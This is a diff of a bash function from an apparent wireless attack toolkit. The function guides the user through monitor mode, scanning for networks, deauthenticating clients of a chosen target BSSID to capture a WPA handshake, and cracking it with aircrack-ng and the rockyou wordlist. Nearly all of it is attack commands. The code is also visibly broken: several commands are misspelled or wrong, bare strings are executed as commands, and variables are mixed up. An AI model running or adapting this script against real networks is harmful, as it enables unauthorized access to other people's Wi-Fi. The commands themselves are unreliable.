@@ -80,51 +80,57 @@ sudo python3 rsf.py
 } 
 
 
-passcrack() 
-{ 
-echo "Lets get cracking!!" 
-ifconfig  
-sudo aircrack-ng start wlan0  
-sudo fconfig wlan0mon down  
-sudo iwconfig wlan0mon mode monitor  
-sudo ifconfig wlan0mon up  
-
-echo "" 
+passcrack()
+{
+echo "In order to crack your Wifi Password we can use Aircrack-ng while this program does automate some of the proccesses this module will require some interaction from you !"
+echo "To start please open two additional terminal windows these will be used to run a total of 3 commands that will be provided for you ! You will just need to copy, paste and run them !"
+ifconfig 
+echo "As you can see above we have wlan0 this needs to become wlan0mon so we can begin our password cracking attack. This can be changed with the command:"
+echo ""
+echo "sudo airmon-ng start wlan0"
+echo ""
+echo "The following commands should be run only if your first attempt at this password attack is stopped due to an error:"
+echo ""
+"1. sudo aircrack-ng start wlan0" 
+"2. sudo Ifconfig wlan0mon down "
+"3. sudo iwconfig wlan0mon mode monitor" 
+"4. sudo ifconfig wlan0mon up "
+""
 echo "Now that your system is ready to begin cracking your WIFIpassword we can begin with our first command "
 echo "Copy and paste the following command into the terminal window you had previously opened and press Enter. Command: sudo airodump-ng wlan0mon"
 echo "When this is running you will see of all the available Wireless Networks within range. You will notice theres also information about these networks such as a unique BSSID, Channel (CH), Data etc"
 echo "To breach your network we will require the networks BSSID and Channel and the name of a file chosen by you that will contain the WPA Handshake we will attempt to capture" 
-echo""
-read -i $TARGET -e TARGET  
+echo"" 
+read -i $TARGET -e TARGET
 read -i $CHANNEL -e CHANNEL
 read -i $FILE -e FILE
 echo "Now it is important that you follow this next step closely. In one of your open terminal windows paste the command: sudo airmon-ng -w" $FILE "-c" $CHANNEL "--bssid" $TARGET "wlan0mon"
-echo "Before you run that command ensure you have your second terminal window open and have th command: Sudo airoplay-ng –deauth 0 –a" $TARGET "wlan0mon pasted in"
+echo "Before you run that command ensure you have your second terminal window open and have th command: Sudo airoplay-ng -–deauth 0 -a " $TARGET "wlan0mon pasted in"
 echo "Now begin running both of these commands on focus on the terminal with the airmon-ng command, and look for a WPA Handshake message to appear above the current information displayed"
 echo "Have you successful been shown the WPA Handshake capture message? [Y]es , [N]o"
 read -i $ANS -e ANS
 if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
                 echo "You must enter a valid answer"
-                elif [ "$SOURCE" = "y" ]; then   
+                elif [ "$ANS" = "y" ]; then  
                 echo "Do you have a [c]ustom  wordlist you would like to use against the target network or would you liew to use the [d]efault wordlist?"
-                read -i $CHOICE -e  CHOICE 
-                if ["$CHOICE" = "c" ]; then
+                read -i $CHOICE -e  CHOICE
+                if [ "$CHOICE" = "c" ]; then
                 echo "PLease enter the name and location of your wordlist e.g if your wordlist is stored in Documents enter Documents/ followed by the name of your wordlist"
                 read -i $LIST -e LIST
                 sudo aircrack-ng $LIST $FILE.cap
-                elif [ "$CHOICE" = "d" ]; then   
+                elif [ "$CHOICE" = "d" ]; then
                 sudo aircrack-ng rockyou.txt $FILE.cap
                 else echo "Not a valid option! Using default list instead "
                 echo ""
                 sudo aircrack-ng rockyou.txt $FILE.cap        
                 fi
-                elif [ "$SOURCE" = "n" ]; then   
+                elif [ "$SOURCE" = "n" ]; then
                 echo "Since WPA Handshake was not captured we will need to restart the machine to try the process again"
                 else echo "Not a valid option! Therefore the process has been halted. Restart Required to try again "
                 echo ""
                 fi
 echo ""
-echo "" 
+echo ""
 }
 
 
